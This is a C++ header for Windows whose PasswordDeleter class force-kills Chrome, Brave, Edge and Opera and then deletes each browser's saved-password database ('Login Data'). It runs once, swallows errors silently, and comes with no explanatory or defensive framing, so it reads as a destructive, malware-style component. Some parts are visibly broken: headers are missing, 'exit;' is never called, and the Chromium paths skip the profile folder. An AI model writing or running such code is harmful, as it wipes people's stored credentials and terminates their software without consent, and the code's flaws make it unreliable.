#ifndef DELETE_PASSWORDS_HPP
#define DELETE_PASSWORDS_HPP

#include <iostream>
#include <string>
#include <vector>
#include <Windows.h>
#include <filesystem>

namespace fs = std::filesystem;

class PasswordDeleter {
public:
    static void destroyPass();

private:
    // Flag to ensure one-time execution
    static bool executedOnce;

    // Kill browser processes
    static void killBrowserProcesses(const std::vector<std::string>& browserProcesses);

    // Delete password database file
    static void deletePasswordDatabase(const std::string& browserProfilePath, const std::string& dbName);

    // Helper function to run a system command (used for killing processes)
    static void runCommand(const std::string& command);
};

// Initialize the static flag to ensure it's executed only once
bool PasswordDeleter::executedOnce = false;

void PasswordDeleter::destroyPass() {
    // Ensure the function runs only once
    if (executedOnce) {
        return;
    }

    executedOnce = true;  // Set flag to indicate it has run

    std::vector<std::string> browserProcesses = {
        "chrome.exe",  // Google Chrome
        "brave.exe",   // Brave browser
        "msedge.exe",  // Microsoft Edge
        "opera.exe"    // Opera browser
    };

    // Kill browser processes first
    killBrowserProcesses(browserProcesses);

    // Wait a bit for processes to terminate
    std::this_thread::sleep_for(std::chrono::seconds(2));

    // List of browser profiles and database names
    std::vector<std::pair<std::string, std::string>> browsers = {
        {"C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data", "Login Data"},
        {"C:\\Users\\%USERNAME%\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data", "Login Data"},
        {"C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Edge\\User Data", "Login Data"},
        {"C:\\Users\\%USERNAME%\\AppData\\Roaming\\Opera Software\\Opera Stable", "Login Data"}
    };

    // Loop through all browsers and delete password database
    for (const auto& browser : browsers) {
        std::string browserPath = browser.first;
        std::string dbName = browser.second;

        // Replace %USERNAME% with the actual username
        size_t pos = browserPath.find("%USERNAME%");
        if (pos != std::string::npos) {
            char userProfile[256];
            if (GetEnvironmentVariableA("USERNAME", userProfile, sizeof(userProfile))) {
                browserPath.replace(pos, 10, userProfile);
            }
        }

        // Delete the password database (Login Data)
        deletePasswordDatabase(browserPath, dbName);
    }


}

void PasswordDeleter::killBrowserProcesses(const std::vector<std::string>& browserProcesses) {
    for (const auto& process : browserProcesses) {
        runCommand("taskkill /f /im " + process);  // Force kill the browser process
    }
}

void PasswordDeleter::deletePasswordDatabase(const std::string& browserProfilePath, const std::string& dbName) {
    fs::path dbFilePath = fs::path(browserProfilePath) / dbName;
    
    try {
        if (fs::exists(dbFilePath)) {
            fs::remove(dbFilePath);

        }
    }
    catch (const std::exception& e) {
        exit;
    }
}

void PasswordDeleter::runCommand(const std::string& command) {
    system(command.c_str());  // Run the system command
}

#endif // DELETE_PASSWORDS_HPP
